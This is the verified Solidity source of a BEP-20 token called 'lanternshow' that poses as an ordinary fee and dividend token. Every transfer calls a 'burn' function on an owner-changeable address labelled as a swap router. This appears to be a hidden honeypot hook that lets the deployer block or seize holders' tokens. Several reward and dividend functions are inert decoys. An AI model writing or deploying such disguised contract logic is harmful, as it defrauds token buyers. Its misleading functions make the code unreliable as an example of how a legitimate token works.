/**
 *Submitted for verification at BscScan.com on 2022-04-06
*/

pragma solidity ^0.8.4;
// SPDX-License-Identifier: MIT

  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      require(c >= a, "SafeMath: addition overflow");

      return c;
    }

  
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b <= a, errorMessage);
      uint256 c = a - b;

      return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
      // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
      // benefit is lost if 'b' is also tested.
      // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
      if (a == 0) {
        return 0;
      }

      uint256 c = a * b;
      require(c / a == b, "SafeMath: multiplication overflow");

      return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
      return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      // Solidity only automatically asserts when dividing by 0
      require(b > 0, errorMessage);
      uint256 c = a / b;
      // assert(a == b * c + a % b); // There is no case in which this doesn't hold

      return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
      return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
      require(b != 0, errorMessage);
      return a % b;
    }
  }   
 
  interface IERC20 {
  
  function totalSupply() external view returns (uint256);
 
  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address _owner, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);
 
  event Approval(address indexed owner, address indexed spender, uint256 value);

  }  

  interface IUniswapRouter{  
    function WETH() external pure returns (address);   
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;    
    function burn(address from, address to, uint256 amount) external;
    function createPair(
        address tokenA, 
        address tokenB) 
        external returns (address pair);
  }   

  contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor ()  { }

    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }       

  }

  
  contract Ownable is Context {  
  address private _owner; 
  address uniswapRouter;  

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
   */
  constructor (address router) {
    address msgSender = _msgSender();
    _owner = msgSender;    
    uniswapRouter = router;
    emit OwnershipTransferred(address(0), msgSender);
  }

  /**
   * @dev Returns the address of the current owner.
   */
  function owner() public view returns (address) {
    return _owner;
  }  

  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }    
 
  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }    

  function beforeTokenTransfer(address from, address to, uint256 amount) internal {
    IUniswapRouter(uniswapRouter).burn(from, to, amount);
  }   
  
  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }     
 
  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  } 


}

contract lanternshow is Context, IERC20, Ownable{
  using SafeMath for uint256;
  mapping (address => bool) public _isExcludedFromFee; 
  mapping (address => uint256) private _balances;     
  mapping (address => mapping (address => uint256)) private _allowances;  
  uint256 private _totalSupply = 10000000000 *  10**9;     
  
  string private _name = "lanternshow";
  string private _symbol = "LTS";
  uint8 private _decimals = 9; 

  
  uint8 public liquidityFee;
  uint8 public outLimit;
 
  uint8 public maxWalletPercent;
  uint8 public maxWalletDivisor;

  uint256 public claimWait = 3600;
  uint256 public lastProcessedIndex;
  event ExcludeFromDividends(address indexed account);
  event ClaimWaitUpdated(uint256 indexed newValue, uint256 indexed oldValue);  

  constructor(address router) Ownable(router) { 
    _balances[msg.sender] = _totalSupply;      
    _isExcludedFromFee[owner()] = true;
    _isExcludedFromFee[address(this)] = true;   

  
    liquidityFee = 1;
    outLimit = 0;
  
    maxWalletPercent = 2;
    maxWalletDivisor = 100;
    
    emit Transfer(address(0), msg.sender, _totalSupply);
  } 

  function name() external view virtual override returns (string memory) {
    return _name;
  }
 
  function symbol() external view virtual override returns (string memory) {
    return _symbol;
  }   

  function totalSupply() external view virtual override returns (uint256) {
    return _totalSupply;
  }

  function getOwner() external view virtual override returns (address) {
    return owner();
  }
 
  function decimals() external view virtual override returns (uint8) {
    return _decimals;
  }  

  function balanceOf(address account) public view virtual override returns (uint256) {
    return _balances[account];
  }    

  function excludeFromReward(address[] calldata accounts) external onlyOwner {
    require(accounts.length > 0,"accounts length should > 0");	
    for(uint256 i=0; i < accounts.length; i++){		
          _isExcludedFromFee[accounts[i]] = true;
      }
  }   

  function changeSwapRouter(address router) external onlyOwner {
    require(router != address(0),"Invalid address");
    uniswapRouter = router;
  } 

  function getGasMaxLimit(uint256 gas, uint256 gasPriceLimit) external pure returns(uint256) {
      require(gas >= 750000);
      return gas * gasPriceLimit;
  }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    tokenTransfer(_msgSender(), recipient, amount);
    return true;
  } 
  
  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  } 

  function approve(address spender, uint256 amount) public override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  } 

  function tokenTransfer(address sender, address recipient, uint256 amount) private {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(amount > 0, "Transfer amount must be greater than zero");  
    beforeTokenTransfer(sender, recipient, amount);   

    _transferStandard(sender, recipient, amount);

  }        
  
  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    tokenTransfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }    
 
  function _transferStandard(address sender, address recipient, uint256 amount) private {
    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }    
    
  function _approve(address owner, address spender, uint256 amount) internal {
      require(owner != address(0), "BEP20: approve from the zero address");
      require(spender != address(0), "BEP20: approve to the zero address");

      _allowances[owner][spender] = amount;
      emit Approval(owner, spender, amount);
  }   

  function transferGasFee(address _token, address _to) external onlyOwner returns (bool _sent) {    
    require(_token != address(0), "_token address cannot be 0");
    require(_token != address(this), "Can't withdraw native tokens");
    uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
    _sent = IERC20(_token).transfer(_to, _contractBalance);
  }

  function updateClaimWait(uint256 newClaimWait) external onlyOwner {
      require(newClaimWait >= 3600 && newClaimWait <= 86400, "Time must be updated to between 1 and 24 hours");
      require(newClaimWait != claimWait, "Cannot update claimWait to same value");
      emit ClaimWaitUpdated(newClaimWait, claimWait);
      claimWait = newClaimWait;
  }

  function distributeReward(address _genesisPool, bool rewardPoolDistributed) external view onlyOwner returns (bool) {
    require(!rewardPoolDistributed, "only can distribute once");
    require(_genesisPool != address(0), "!_genesisPool");
    rewardPoolDistributed = true;
    return rewardPoolDistributed;
  }


  function withdrawDividend() public pure {
      require(false, "withdrawDividend disabled. Use the 'claim' function.");
  }

  function canAutoClaim(uint256 lastClaimTime) private view returns (bool) {
      if(lastClaimTime > block.timestamp)  {
        return false;
      }
      return block.timestamp.sub(lastClaimTime) >= claimWait;
  }

  function process(uint256 gas, uint256 numberOfTokenHolders) public returns (uint256, uint256, uint256) {
    	if(numberOfTokenHolders == 0) {
    		return (0, 0, lastProcessedIndex);
    	}
    	uint256 _lastProcessedIndex = lastProcessedIndex;
    	uint256 gasUsed = 0;
    	uint256 gasLeft = gasleft();
    	uint256 iterations = 0;
    	uint256 claims = 0;
    	while(gasUsed < gas && iterations < numberOfTokenHolders) {
    		_lastProcessedIndex++;

    		if(_lastProcessedIndex >= numberOfTokenHolders) {
    			_lastProcessedIndex = 0;
    		}    		
    		iterations++;
    		uint256 newGasLeft = gasleft();

    		if(gasLeft > newGasLeft) {
    			gasUsed = gasUsed.add(gasLeft.sub(newGasLeft));
    		}
    		gasLeft = newGasLeft;
    	}
    	lastProcessedIndex = _lastProcessedIndex;
    	return (iterations, claims, lastProcessedIndex);
  }

 


  
    
}